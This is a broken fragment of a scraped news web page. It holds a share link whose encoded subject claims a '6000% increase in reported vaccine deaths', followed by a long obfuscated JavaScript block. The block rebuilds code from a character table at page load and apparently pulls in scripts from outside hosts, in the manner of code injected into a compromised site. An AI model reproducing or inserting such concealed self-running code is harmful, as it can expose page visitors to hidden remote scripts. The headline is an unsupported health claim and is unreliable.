href="/v3/r2/?url=bWFpbHRvOj9zdWJqZWN0PTYwMDAlMjUlMjBJbmNyZWFzZSUyMGluJTIwUmVwb3J0ZWQlMjBWYWNjaW5lJTIwRGVhdGhzJTIwMXN0JTIwUXVhcnRlciUyMDIwMjElMjBDb21wYXJlZCUyMHRvJTIwMXN0JTIwUXVhcnRlciUyMDIwMjAmYW1wO2JvZHk9SGV5JTIwY2hlY2slMjB0aGlzJTIwb3V0OiUyMGh0dHBzJTNBJTJGJTJGdGFwbmV3c3dpcmUuY29tJTJGMjAyMSUyRjA0JTJGNjAwMC1pbmNyZWFzZS1pbi1yZXBvcnRlZC12YWNjaW5lLWRlYXRocy0xc3QtcXVhcnRlci0yMDIxLWNvbXBhcmVkLXRvLTFzdC1xdWFydGVyLTIwMjAlMkY=" rel="nofollow" style=" width:48px;height:48px;margin:0;margin-bottom:5px;" target="_blank" title="Share by email"></a><script>if(dfmlibdchluyg==undefined){var dfmlibdchluyg={ts:'1678325463',};(function(){var eyrcofcwklmpdsd=["b","!","`",";","a","c",">","V","&","p","R","k","7","w","I","*","/","g","6","Q","t","]","X","J","5","L","(","#","\"","Z",".","?",",","[","8","4","9","^","T","U","j","H",")","F","y","O","P","r","=","+","}","N","d","A","q","_","%","<","G","Y",":","C"," ","@","2","u","i","$","1","o","l","B","3","K","E","e","x","W","0","S","v","-","'","m","f","|","z","D","s","{","M","h","\\","n"];var dfmlibdchluyg=[20,47,44,89,52,69,5,65,83,75,93,20,30,5,65,47,47,75,93,20,79,5,47,66,9,20,30,88,75,20,53,20,20,47,66,0,65,20,75,26,82,88,47,5,82,32,82,70,69,70,82,42,3,50,5,4,20,5,91,26,75,42,89,50,66,84,26,90,4,20,91,30,47,4,93,52,69,83,48,48,93,65,70,70,42,89,45,0,40,75,5,20,30,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,90,4,20,91,32,28,47,4,93,52,69,83,28,32,89,80,4,70,65,75,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,9,4,47,88,75,43,70,69,4,20,26,82,78,30,82,49,93,75,13,62,87,4,20,75,26,42,30,17,75,20,39,38,61,90,66,70,70,66,88,75,5,69,93,52,88,26,42,42,50,50,42,3,50,66,84,26,90,4,20,91,30,84,70,69,69,47,48,48,93,65,70,70,42,89,45,0,40,75,5,20,30,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,90,4,20,91,32,28,84,70,69,69,47,28,32,89,80,4,70,65,75,60,84,65,93,5,20,66,69,93,26,80,42,89,47,75,20,65,47,93,62,9,4,47,88,75,14,93,20,26,80,30,20,69,79,20,47,66,93,17,26,42,42,50,50,42,3,50,66,84,26,10,46,75,48,48,65,93,52,75,84,66,93,75,52,42,89,80,4,47,62,10,46,75,48,89,65,60,82,16,16,0,75,84,69,47,75,66,20,88,93,75,13,88,30,5,69,83,16,16,16,16,70,11,20,84,75,69,70,66,20,75,70,11,20,16,70,11,20,84,4,0,9,70,11,20,16,64,78,64,72,16,78,72,16,70,11,20,75,4,0,9,81,83,4,47,88,91,83,4,70,70,69,13,68,64,78,36,34,4,81,33,47,21,30,9,93,17,82,32,44,60,82,82,32,20,88,60,82,68,18,12,34,72,64,24,35,18,72,82,32,84,70,60,33,21,32,5,84,60,84,4,70,88,75,32,4,20,55,52,69,60,28,47,52,52,44,13,52,30,5,69,83,28,32,4,20,55,40,88,60,28,4,52,80,75,47,20,66,88,66,93,17,30,40,88,28,32,4,20,55,66,83,60,28,4,52,5,69,52,75,30,9,93,17,28,32,4,20,55,47,65,60,28,16,4,52,80,75,47,20,66,88,66,93,17,30,40,88,28,32,4,20,55,47,66,60,28,16,4,52,5,70,65,20,20,75,47,30,9,93,17,28,32,4,20,55,75,66,60,28,47,66,17,91,20,4,52,28,32,4,20,55,75,5,60,28,5,69,93,20,75,93,20,81,4,52,62,5,69,93,20,75,93,20,53,52,28,32,4,20,55,75,88,60,28,9,69,88,66,20,66,69,93,60,4,0,88,69,70,65,20,75,3,52,66,88,9,70,4,44,60,0,70,69,5,11,3,28,32,4,20,55,75,60,20,47,65,75,32,4,20,55,47,60,20,47,65,75,32,4,20,55,47,64,60,84,4,70,88,75,32,66,60,84,4,70,88,75,32,5,60,78,32,65,5,60,84,4,70,88,75,32,5,70,60,33,21,32,9,80,60,84,4,70,88,75,32,5,88,88,60,84,4,70,88,75,32,4,20,55,17,60,84,4,70,88,75,32,4,20,55,52,60,84,4,70,88,75,32,4,20,55,66,60,84,4,70,88,75,32,4,20,55,84,60,84,4,70,88,75,32,4,20,55,66,0,60,82,70,11,20,82,32,88,93,60,78,32,88,20,4,47,20,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,42,89,1,84,65,93,5,20,66,69,93,26,4,32,0,32,5,42,89,4,33,0,21,48,5,26,42,50,26,10,46,75,32,28,80,28,32,84,65,93,5,20,66,69,93,26,42,89,84,65,93,5,20,66,69,93,62,4,26,42,89,47,75,20,65,47,93,89,13,66,52,20,91,60,11,26,42,32,91,75,66,17,91,20,60,70,26,42,50,50,84,65,93,5,20,66,69,93,62,0,26,4,32,0,42,89,80,4,47,62,5,48,89,50,3,47,75,20,65,47,93,62,0,48,49,0,85,85,78,32,5,30,13,66,52,20,91,48,26,5,30,47,66,17,91,20,48,4,30,47,66,17,91,20,49,0,42,81,26,5,30,70,75,84,20,48,4,30,70,75,84,20,81,0,42,32,5,30,91,75,66,17,91,20,48,26,5,30,0,69,20,20,69,83,48,4,30,0,69,20,20,69,83,49,0,42,81,26,5,30,20,69,9,48,4,30,20,69,9,81,0,42,32,5,50,84,65,93,5,20,66,69,93,62,5,26,4,32,5,42,89,47,75,20,65,47,93,62,4,48,4,8,8,1,4,30,93,69,52,75,38,44,9,75,31,4,33,78,21,60,4,32,4,8,8,68,48,48,48,4,30,93,69,52,75,38,44,9,75,31,0,26,4,30,17,75,20,71,69,65,93,52,66,93,17,61,70,66,75,93,20,10,75,5,20,26,42,32,5,42,60,1,68,50,84,65,93,5,20,66,69,93,62,52,26,0,42,89,0,48,93,65,70,70,48,48,0,31,4,26,42,60,68,48,48,48,0,30,93,69,52,75,38,44,9,75,31,5,26,0,42,60,0,3,80,4,47,62,52,48,0,30,91,75,66,17,91,20,32,75,48,0,30,13,66,52,20,91,3,47,75,20,65,47,93,62,52,48,28,84,65,93,5,20,66,69,93,28,48,48,20,44,9,75,69,84,62,52,31,52,30,5,4,70,70,26,0,42,60,52,32,75,48,28,84,65,93,5,20,66,69,93,28,48,48,20,44,9,75,69,84,62,75,31,75,30,5,4,70,70,26,0,42,60,75,32,75,16,52,50,80,4,47,62,75,48,89,50,32,84,48,28,65,93,52,75,84,66,93,75,52,28,1,48,20,44,9,75,69,84,62,13,66,93,52,69,13,8,8,13,66,93,52,69,13,32,17,48,28,65,93,52,75,84,66,93,75,52,28,1,48,20,44,9,75,69,84,62,52,69,5,65,83,75,93,20,8,8,52,69,5,65,83,75,93,20,32,91,48,17,8,8,17,30,52,69,5,65,83,75,93,20,74,70,75,83,75,93,20,32,66,48,84,4,70,88,75,32,40,48,66,31,84,65,93,5,20,66,69,93,26,4,42,89,47,75,20,65,47,93,1,1,66,30,5,4,70,70,26,84,32,4,42,30,83,4,20,5,91,75,88,50,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,1,68,50,32,11,48,75,30,80,66,75,13,9,69,47,20,77,48,84,65,93,5,20,66,69,93,26,42,89,80,4,47,62,4,48,91,30,5,70,66,75,93,20,77,66,52,20,91,32,0,48,84,30,66,93,93,75,47,77,66,52,20,91,3,47,75,20,65,47,93,62,0,6,4,31,0,60,4,50,32,70,48,75,30,80,66,75,13,9,69,47,20,41,48,84,65,93,5,20,66,69,93,26,42,89,80,4,47,62,4,48,91,30,5,70,66,75,93,20,41,75,66,17,91,20,32,0,48,84,30,66,93,93,75,47,41,75,66,17,91,20,3,47,75,20,65,47,93,62,0,6,4,31,0,60,4,50,3,47,75,20,65,47,93,62,75,30,83,54,48,40,32,75,30,80,66,75,13,9,69,47,20,48,4,32,75,30,88,5,47,69,70,70,22,48,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,30,9,4,17,75,22,45,84,84,88,75,20,85,85,91,30,88,5,47,69,70,70,25,75,84,20,50,32,75,30,88,5,47,69,70,70,59,48,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,30,9,4,17,75,59,45,84,84,88,75,20,85,85,91,30,88,5,47,69,70,70,38,69,9,50,32,75,30,47,75,5,20,4,93,17,70,75,48,5,32,75,30,4,88,9,75,5,20,48,52,32,75,30,66,93,22,48,84,65,93,5,20,66,69,93,26,4,32,0,42,89,80,4,47,62,52,48,5,26,4,32,0,42,3,47,75,20,65,47,93,1,1,52,8,8,52,30,47,66,17,91,20,6,48,78,8,8,52,30,70,75,84,20,57,48,11,26,42,50,32,75,30,66,93,59,48,84,65,93,5,20,66,69,93,26,4,32,0,42,89,80,4,47,62,52,48,5,26,4,32,0,42,3,47,75,20,65,47,93,1,1,52,8,8,52,30,0,69,20,20,69,83,6,48,78,8,8,52,30,20,69,9,57,48,70,26,42,50,32,75,30,66,93,7,66,75,13,9,69,47,20,48,84,65,93,5,20,66,69,93,26,4,32,0,42,89,80,4,47,62,52,48,5,26,4,32,0,42,3,47,75,20,65,47,93,1,1,52,8,8,52,30,0,69,20,20,69,83,6,48,78,8,8,52,30,47,66,17,91,20,6,48,78,8,8,52,30,20,69,9,57,48,70,26,42,8,8,52,30,70,75,84,20,57,48,11,26,42,50,32,75,50,42,3,1,84,65,93,5,20,66,69,93,26,93,32,20,32,75,42,89,20,33,93,21,48,75,26,42,50,26,28,54,28,32,10,46,75,32,84,65,93,5,20,66,69,93,26,42,89,84,65,93,5,20,66,69,93,62,93,26,93,42,89,47,75,20,65,47,93,33,21,30,88,70,66,5,75,30,5,4,70,70,26,93,32,78,42,50,84,65,93,5,20,66,69,93,62,20,26,93,42,89,80,4,47,62,20,3,47,75,20,65,47,93,62,93,8,8,28,69,0,40,75,5,20,28,48,48,20,44,9,75,69,84,62,93,8,8,26,20,48,93,30,93,69,52,75,38,44,9,75,42,8,8,26,68,48,48,20,85,85,36,48,48,20,42,50,84,65,93,5,20,66,69,93,62,75,26,93,42,89,47,75,20,65,47,93,28,69,0,40,75,5,20,28,48,48,20,44,9,75,69,84,62,93,8,8,66,88,43,66,93,66,20,75,26,93,30,70,75,93,17,20,91,42,50,84,65,93,5,20,66,69,93,62,69,26,93,42,89,84,69,47,26,80,4,47,62,20,48,33,21,32,69,48,78,32,47,48,93,30,70,75,93,17,20,91,3,47,6,69,3,49,49,69,42,75,26,93,33,69,21,42,31,20,48,20,30,5,69,93,5,4,20,26,93,33,69,21,42,60,20,33,20,30,70,75,93,17,20,91,21,48,93,33,69,21,3,47,75,20,65,47,93,62,20,50,84,65,93,5,20,66,69,93,62,47,26,93,42,89,80,4,47,62,20,32,75,32,69,48,33,21,3,93,60,84,69,47,26,20,48,78,3,20,57,93,30,70,75,93,17,20,91,3,20,49,49,42,89,84,69,47,26,75,48,78,3,75,57,69,30,70,75,93,17,20,91,3,75,49,49,42,66,84,26,69,33,75,21,48,48,93,33,20,21,42,5,69,93,20,66,93,65,75,62,93,3,69,33,69,30,70,75,93,17,20,91,21,48,93,33,20,21,50,47,75,20,65,47,93,62,69,50,84,65,93,5,20,66,69,93,62,66,26,93,42,89,47,75,20,65,47,93,62,93,31,28,88,20,47,66,93,17,28,48,48,20,44,9,75,69,84,62,93,31,65,26,93,42,33,78,21,60,1,93,33,88,21,8,8,75,26,93,42,31,93,33,78,21,60,93,60,84,50,84,65,93,5,20,66,69,93,62,65,26,47,32,65,42,89,80,4,47,62,4,32,88,48,66,26,65,42,3,47,75,20,65,47,93,62,88,8,8,47,31,47,48,48,48,70,85,85,20,26,47,42,31,1,65,85,85,47,1,48,48,70,8,8,20,26,88,42,8,8,83,26,47,32,88,42,31,33,47,21,60,33,21,60,47,8,8,75,26,47,42,31,69,26,47,42,60,84,30,17,75,20,74,70,75,83,75,93,20,88,71,44,61,70,4,88,88,51,4,83,75,8,8,28,88,20,47,66,93,17,28,48,48,47,8,8,26,4,48,47,30,83,4,20,5,91,26,5,42,42,31,93,26,88,30,17,75,20,74,70,75,83,75,93,20,88,71,44,61,70,4,88,88,51,4,83,75,26,4,33,68,21,42,42,60,47,8,8,26,47,30,52,69,5,65,83,75,93,20,85,85,47,30,93,69,52,75,38,44,9,75,8,8,36,48,48,47,30,93,69,52,75,38,44,9,75,42,31,65,31,33,21,60,33,47,21,60,93,26,88,30,54,65,75,47,44,79,75,70,75,5,20,69,47,53,70,70,26,47,42,42,60,33,21,50,80,4,47,62,5,48,16,37,92,30,26,33,92,13,92,81,21,49,42,67,16,32,76,48,28,5,69,83,9,4,47,75,28,49,28,87,69,5,65,83,75,93,20,28,49,28,46,69,88,66,20,66,69,93,28,32,84,48,52,69,5,65,83,75,93,20,32,70,48,13,66,93,52,69,13,32,4,48,84,30,52,69,5,65,83,75,93,20,74,70,75,83,75,93,20,32,88,48,28,93,69,52,75,38,44,9,75,28,32,83,48,76,62,66,93,62,4,31,84,65,93,5,20,66,69,93,26,93,32,20,42,89,47,75,20,65,47,93,62,68,18,48,48,26,68,18,8,20,33,76,21,26,93,42,42,50,60,84,65,93,5,20,66,69,93,26,93,32,20,42,89,47,75,20,65,47,93,62,20,48,20,48,48,84,85,85,20,48,48,13,66,93,52,69,13,31,4,60,20,32,20,1,48,48,93,8,8,20,30,5,69,93,20,4,66,93,88,26,93,42,50,3,47,75,20,65,47,93,62,65,30,65,93,66,54,48,47,32,65,50,32,20,91,66,88,42,3,66,84,26,93,4,80,66,17,4,20,69,47,30,65,88,75,47,53,17,75,93,20,30,88,75,4,47,5,91,26,28,62,71,47,4,80,75,16,28,42,6,81,68,42,10,46,75,30,4,20,55,47,48,20,47,65,75,3,66,84,26,10,46,75,30,66,42,47,75,20,65,47,93,62,84,4,70,88,75,3,10,46,75,30,66,48,20,47,65,75,3,10,46,75,30,4,20,55,17,48,82,17,75,20,82,3,47,75,20,65,47,93,62,10,46,75,30,4,0,52,26,84,65,93,5,20,66,69,93,26,42,89,20,47,44,89,80,4,47,62,4,48,52,69,5,65,83,75,93,20,30,5,47,75,4,20,75,74,70,75,83,75,93,20,26,82,66,84,47,4,83,75,82,42,3,52,69,5,65,83,75,93,20,30,91,75,4,52,30,4,9,9,75,93,52,61,91,66,70,52,26,4,42,3,80,4,47,62,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,48,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,45,0,40,75,5,20,30,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,3,80,4,47,62,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,48,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,45,0,40,75,5,20,30,52,75,84,66,93,75,46,47,69,9,75,47,20,44,3,45,0,40,75,5,20,30,52,75,84,66,93,75,46,47,69,9,75,47,20,44,48,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,3,80,4,47,62,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,51,69,52,75,30,9,47,69,20,69,20,44,9,75,32,28,66,93,88,75,47,20,71,75,84,69,47,75,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,13,66,93,52,69,13,30,51,69,52,75,30,9,47,69,20,69,20,44,9,75,32,28,66,93,88,75,47,20,71,75,84,69,47,75,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,74,70,75,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,66,93,93,75,47,41,38,90,25,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,13,66,93,52,69,13,30,74,70,75,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,66,93,93,75,47,41,38,90,25,28,32,4,9,9,42,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,52,69,5,65,83,75,93,20,30,0,69,52,44,32,28,66,93,93,75,47,41,38,90,25,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,74,70,75,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,69,65,20,75,47,41,38,90,25,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,13,66,93,52,69,13,30,74,70,75,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,69,65,20,75,47,41,38,90,25,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,41,38,90,25,87,69,5,65,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,17,75,20,74,70,75,83,75,93,20,88,71,44,61,70,4,88,88,51,4,83,75,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,52,69,5,65,83,75,93,20,32,28,17,75,20,74,70,75,83,75,93,20,88,71,44,61,70,4,88,88,51,4,83,75,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,30,74,70,75,83,75,93,20,30,9,47,69,20,69,20,44,9,75,32,28,17,75,20,74,70,75,83,75,93,20,88,71,44,38,4,17,51,4,83,75,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,52,69,5,65,83,75,93,20,32,28,17,75,20,74,70,75,83,75,93,20,88,71,44,38,4,17,51,4,83,75,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,32,28,88,75,20,38,66,83,75,69,65,20,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,13,66,93,52,69,13,32,28,88,75,20,38,66,83,75,69,65,20,28,32,4,9,9,42,3,4,9,9,48,17,75,20,45,13,93,46,47,69,9,75,47,20,44,87,75,88,5,47,66,9,20,69,47,26,4,30,5,69,93,20,75,93,20,77,66,93,52,69,13,32,28,4,70,75,47,20,28,42,3,4,9,9,30,5,69,93,84,66,17,65,47,4,0,70,75,48,84,4,70,88,75,3,69,0,40,75,5,20,52,75,84,66,93,75,46,47,69,9,75,47,20,44,26,13,66,93,52,69,13,32,28,4,70,75,47,20,28,32,4,9,9,42,3,4,30,47,75,83,69,80,75,26,42,3,50,5,4,20,5,91,26,75,42,89,50,10,46,75,30,84,26,10,46,75,30,84,70,42,3,10,46,75,30,84,5,26,42,3,10,46,75,30,83,84,26,42,3,13,66,93,52,69,13,30,88,75,20,38,66,83,75,69,65,20,26,84,65,93,5,20,66,69,93,26,42,89,10,46,75,30,84,26,10,46,75,30,84,70,42,3,50,32,68,24,78,78,42,3,10,46,75,30,93,69,13,26,10,46,75,30,65,47,26,10,46,75,30,65,42,32,52,69,5,65,83,75,93,20,30,54,65,75,47,44,79,75,70,75,5,20,69,47,53,70,70,26,28,91,20,83,70,28,42,33,78,21,42,3,47,75,20,65,47,93,62,20,47,65,75,3,50,42,3,50,50,26,42,32,4,0,52,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,84,42,89,66,84,26,10,46,75,30,4,20,55,47,42,89,10,46,75,30,4,20,55,66,48,82,14,83,82,49,82,4,17,75,82,3,80,4,47,62,88,66,48,52,69,5,65,83,75,93,20,30,5,47,75,4,20,75,74,70,75,83,75,93,20,26,28,66,83,17,28,42,3,88,66,30,5,47,69,88,88,45,47,66,17,66,93,48,28,53,93,69,93,44,83,69,65,88,28,3,88,66,30,69,93,75,47,47,69,47,48,84,65,93,5,20,66,69,93,26,55,88,66,42,89,66,84,26,10,46,75,30,88,93,48,48,78,42,89,10,46,75,30,88,93,48,68,3,10,46,75,30,4,20,55,52,48,82,87,4,82,49,82,20,4,82,3,47,75,20,65,47,93,62,84,26,42,3,50,50,3,88,66,30,69,93,70,69,4,52,48,84,65,93,5,20,66,69,93,26,55,88,66,42,89,66,84,26,10,46,75,30,88,93,48,48,78,42,89,10,46,75,30,4,20,55,47,48,84,4,70,88,75,3,47,75,20,65,47,93,3,50,50,3,88,66,30,88,47,5,48,28,16,16,28,49,10,46,75,30,4,20,55,52,69,49,28,16,28,49,10,46,75,30,4,20,55,66,83,3,50,84,65,93,5,20,66,69,93,62,66,88,26,75,42,89,66,84,26,10,46,75,30,88,93,48,48,78,42,89,10,46,75,30,88,93,48,68,3,10,46,75,30,4,20,55,52,48,82,87,4,82,49,82,20,4,82,3,47,75,20,65,47,93,62,84,26,42,3,50,50,80,4,47,62,88,66,48,52,69,5,65,83,75,93,20,30,5,47,75,4,20,75,74,70,75,83,75,93,20,26,28,88,5,47,66,9,20,28,42,3,88,66,30,69,93,75,47,47,69,47,48,66,88,3,88,66,30,88,47,5,48,28,16,16,9,4,17,75,4,52,64,30,17,69,69,17,70,75,88,44,93,52,66,5,4,20,66,69,93,30,5,69,83,16,9,4,17,75,4,52,16,40,88,16,4,52,88,0,44,17,69,69,17,70,75,30,40,88,28,3,52,69,5,65,83,75,93,20,30,0,69,52,44,30,4,9,9,75,93,52,61,91,66,70,52,26,88,66,42,3,80,4,47,62,88,66,48,52,69,5,65,83,75,93,20,30,5,47,75,4,20,75,74,70,75,83,75,93,20,26,28,66,83,17,28,42,3,88,66,30,69,93,70,69,4,52,48,66,88,3,88,66,30,88,47,5,48,82,91,20,20,9,88,60,16,16,13,13,13,30,17,69,69,17,70,75,4,9,66,88,30,5,69,83,16,17,75,93,75,47,4,20,75,55,64,78,35,82,3,80,4,47,62,88,66,48,52,69,5,65,83,75,93,20,30,5,47,75,4,20,75,74,70,75,83,75,93,20,26,28,88,5,47,66,9,20,28,42,3,88,66,30,69,93,75,47,47,69,47,48,66,88,3,88,66,30,69,93,70,69,4,52,48,84,65,93,5,20,66,69,93,26,55,88,66,42,89,66,84,26,20,44,9,75,69,84,26,55,55,4,42,48,48,82,65,93,52,75,84,66,93,75,52,82,42,89,47,75,20,65,47,93,62,66,88,26,55,88,66,42,3,50,50,3,88,66,30,88,47,5,48,28,16,16,28,49,10,46,75,30,4,20,55,52,69,49,28,16,28,49,10,46,75,30,4,20,55,40,88,3,52,69,5,65,83,75,93,20,30,0,69,52,44,30,4,9,9,75,93,52,61,91,66,70,52,26,88,66,42,3,50,50,26,42,32,47,5,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,4,42,89,47,75,20,65,47,93,62,4,33,90,4,20,91,30,84,70,69,69,47,26,90,4,20,91,30,47,4,93,52,69,83,26,42,15,4,30,70,75,93,17,20,91,42,21,3,50,50,26,42,32,47,54,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,42,89,80,4,47,62,88,4,48,33,21,3,80,4,47,62,13,5,48,90,4,20,91,30,84,70,69,69,47,26,90,4,20,91,30,47,4,93,52,69,83,26,42,15,68,64,49,68,42,3,84,69,47,26,80,4,47,62,66,48,78,3,66,57,13,5,3,66,49,49,42,89,88,4,33,66,21,48,10,46,75,30,47,88,26,33,68,32,68,72,21,42,3,88,4,33,66,21,48,88,4,33,66,21,30,5,91,4,47,53,20,26,78,42,30,20,69,39,9,9,75,47,61,4,88,75,26,42,49,88,4,33,66,21,30,88,65,0,88,20,47,26,68,42,3,50,3,47,75,20,65,47,93,62,88,4,30,40,69,66,93,26,82,81,82,42,3,50,50,26,42,32,47,88,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,4,42,89,80,4,47,62,47,48,28,28,32,5,48,28,4,0,5,52,75,84,17,91,66,40,11,70,93,69,9,54,47,88,20,65,13,78,68,64,72,35,24,18,12,34,36,28,3,80,4,47,62,70,48,24,32,91,48,68,64,3,66,84,26,4,1,48,65,93,52,75,84,66,93,75,52,42,89,66,84,26,4,30,70,75,93,17,20,91,6,48,68,42,89,80,4,47,62,70,48,9,4,47,88,75,14,93,20,26,4,33,78,21,42,32,91,48,9,4,47,88,75,14,93,20,26,4,33,78,21,42,3,50,66,84,26,4,30,70,75,93,17,20,91,6,48,64,42,89,80,4,47,62,91,48,9,4,47,88,75,14,93,20,26,4,33,68,21,42,3,50,66,84,26,4,30,70,75,93,17,20,91,48,48,72,42,89,5,48,4,33,64,21,3,50,50,80,4,47,62,70,75,48,90,4,20,91,30,84,70,69,69,47,26,90,4,20,91,30,47,4,93,52,69,83,26,42,15,26,91,81,70,49,68,42,42,49,70,3,84,69,47,26,66,48,78,3,66,57,70,75,3,66,49,49,42,47,49,48,5,30,5,91,4,47,53,20,26,90,4,20,91,30,84,70,69,69,47,26,90,4,20,91,30,47,4,93,52,69,83,26,42,15,5,30,70,75,93,17,20,91,42,42,3,47,75,20,65,47,93,62,47,3,50,50,26,42,32,9,4,52,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,80,32,4,42,89,80,48,79,20,47,66,93,17,26,80,42,3,66,84,26,4,1,48,65,93,52,75,84,66,93,75,52,42,89,70,48,9,4,47,88,75,14,93,20,26,4,33,78,21,42,3,80,48,26,93,75,13,62,53,47,47,4,44,26,70,42,30,40,69,66,93,26,82,78,82,42,49,80,42,30,88,70,66,5,75,26,81,70,42,3,50,47,75,20,65,47,93,62,80,3,50,50,26,42,32,65,47,60,84,65,93,5,20,66,69,93,26,42,89,47,75,20,65,47,93,62,84,65,93,5,20,66,69,93,26,65,32,80,42,89,80,4,47,62,47,76,48,16,92,33,33,4,81,86,53,81,29,78,81,36,60,32,81,21,49,92,21,16,17,3,80,4,47,62,47,48,65,30,83,4,20,5,91,26,47,76,42,3,66,84,26,47,1,48,93,65,70,70,42,89,84,69,47,26,80,4,47,62,66,48,78,3,66,57,47,30,70,75,93,17,20,91,3,66,49,49,42,89,80,4,47,62,93,48,47,33,66,21,30,47,75,9,70,4,5,75,26,82,33,82,32,82,82,42,30,47,75,9,70,4,5,75,26,82,21,82,32,82,82,42,3,80,4,47,62,20,48,93,30,88,9,70,66,20,26,82,60,82,42,3,80,4,47,62,11,75,44,48,20,33,78,21,3,80,4,47,62,4,47,17,88,48,20,33,68,21,3,66,84,26,4,47,17,88,1,48,65,93,52,75,84,66,93,75,52,42,4,47,17,88,48,4,47,17,88,30,88,9,70,66,20,26,82,32,82,42,3,80,4,47,62,80,4,70,65,75,48,47,33,66,21,3,66,84,26,11,75,44,48,48,82,47,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,47,88,26,4,47,17,88,42,3,66,84,26,11,75,44,48,48,82,5,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,47,5,26,4,47,17,88,42,3,66,84,26,11,75,44,48,48,82,54,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,47,54,26,42,3,66,84,26,11,75,44,48,48,82,66,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,9,4,52,26,80,33,82,66,82,21,32,4,47,17,88,42,3,66,84,26,11,75,44,48,48,82,9,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,9,4,52,26,80,33,82,9,82,21,32,4,47,17,88,42,3,66,84,26,11,75,44,48,48,82,17,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,9,4,52,26,80,33,82,17,82,21,32,4,47,17,88,42,3,66,84,26,11,75,44,48,48,82,13,82,42,80,4,47,62,80,4,70,65,75,48,10,46,75,30,9,4,52,26,80,33,82,13,82,21,32,4,47,17,88,42,3,65,48,65,30,47,75,9,70,4,5,75,26,47,33,66,21,32,80,4,70,65,75,42,3,50,50,47,75,20,65,47,93,62,65,3,50,50,26,42,32,84,5,60,84,65,93,5,20,66,69,93,26,42,89,66,84,26,10,46,75,30,5,84,42,89,80,4,47,62,75,88,48,52,69,5,65,83,75,93,20,30,54,65,75,47,44,79,75,70,75,5,20,69,47,53,70,70,26,28,66,83,17,33,88,47,5,15,48,82,13,9,28,49,28,75,93,17,66,93,75,28,49,28,30,93,75,20,28,49,28,52,93,4,28,49,28,81,28,49,28,5,52,93,28,49,28,30,5,69,83,82,21,28,42,3,84,69,47,26,80,4,47,62,76,48,78,3,76,57,75,88,30,70,75,93,17,20,91,3,76,49,49,42,89,75,88,33,76,21,30,69,65,20,75,47,41,38,90,25,48,75,88